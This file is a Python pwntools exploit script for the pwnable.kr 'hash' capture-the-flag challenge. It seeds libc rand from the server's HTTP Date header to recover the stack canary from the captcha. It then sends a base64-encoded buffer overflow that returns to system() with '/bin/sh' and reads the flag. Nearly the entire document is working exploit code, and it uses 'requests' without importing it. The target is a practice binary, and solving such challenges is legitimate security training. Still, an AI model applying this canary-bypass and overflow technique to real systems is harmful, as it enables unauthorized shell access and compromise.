#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9002
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './hash'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 9002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

import ctypes
import ctypes.util
import datetime

libc = ctypes.CDLL(ctypes.util.find_library("c"))

SYSTEM_ADDR = 0x8048880
GLOBAL_BUF_ADDR = 0x0804B0E0

io = start()
r = requests.get("http://pwnable.kr")

server_date = datetime.datetime.strptime(r.headers["Date"], "%a, %d %b %Y %H:%M:%S %Z")
# server_date = datetime.datetime.now()

libc.srand(int(server_date.timestamp()))

nums = [libc.rand() for _ in range(8)]

io.recvuntil(b"Are you human? input captcha : ")
captcha = int(io.recvline().strip())

cookie = (captcha - (nums[4] - nums[6] + nums[7] + nums[2] - nums[3] + nums[1] + nums[5])) % (1 << 32)

if cookie & 0xff:
    # canaries start with a null byte
    log.error("failed to break cookie, exiting...")

io.sendline(str(captcha).encode())

log.info(f"broke cookie: {term.text.yellow(hex(cookie))}")

payload = b"A" * 512  # 512 bytes total
payload += p32(cookie)
payload += b"B" * 12 # 12 bytes total
payload += p32(SYSTEM_ADDR)
payload += b"C" * 4  # 4 bytes total
payload += b"D" * 4  # /bin/sh address placeholder

bin_sh_offset = GLOBAL_BUF_ADDR + len(b64e(payload))

payload = payload[:-4]  # remove placeholder
payload += p32(bin_sh_offset)

payload = b64e(payload).encode()
payload += b"/bin/sh\x00"

padding = len(payload) % 4

payload += b"=" * (4 - padding)

log.info(f"sending payload {payload}")

io.recvuntil(b"Encode your data with BASE64 then paste me!\n")

io.sendline(payload)

io.recvline()

io.sendline(b"cat flag")

log.success(f"flag = {term.text.bold_italic_yellow(io.recvline().strip().decode())}")
